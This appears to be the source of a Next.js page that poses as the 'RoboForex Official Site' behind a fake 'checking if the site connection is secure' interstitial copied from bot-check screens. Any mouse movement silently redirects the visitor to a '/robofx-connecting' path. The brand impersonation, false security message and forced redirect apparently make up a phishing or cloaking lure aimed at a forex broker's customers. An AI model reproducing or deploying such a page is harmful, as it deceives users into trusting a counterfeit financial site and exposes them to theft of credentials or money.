'use client'
import styles from "./page.module.css";
import circel from "../../public/R-tron.png";
import image from "../../public/image.png";
import Image from "next/image";
import { useEffect, useState } from "react";

export default function Home() {
  const [status, setStatus] = useState(true);
  const [hasRedirected, setHasRedirected] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const handleMouseMove = () => {
      window.location.href = "/robofx-connecting";
  };

  return (
    <div 
    onMouseMove={handleMouseMove}
      // onClick={handleClick}
    >
      <main className={styles.main}>
        <h3 className={styles.text}>
          RoboForex Official Site{" "}
          <span
            style={{ transform: "translate(0px)", display: "inline-block" }}
          >
            <Image src={circel} alt="Logo" width={30} height={30} priority />
          </span>
        </h3>
        <p className={styles.text2}>
          Checking if the site connection is secure
        </p>
        <p className={styles.text3}>
          We needs to review the security of your connection before proceeding
          RoboForex
        </p>
        <div style={{ marginTop: 30 }}>
          <Image src={image} alt="Logo" className={styles.image2} />
        </div>
        <p className={styles.text4}>Why am I seeing this page?</p>
        <p className={styles.text5}>
          Requests from malicious bots can pose as legitimate traffic.
          Occasionally, you may see this page while the site ensures that the
          connection is secure.
        </p>
      </main>
    </div>
  );
}
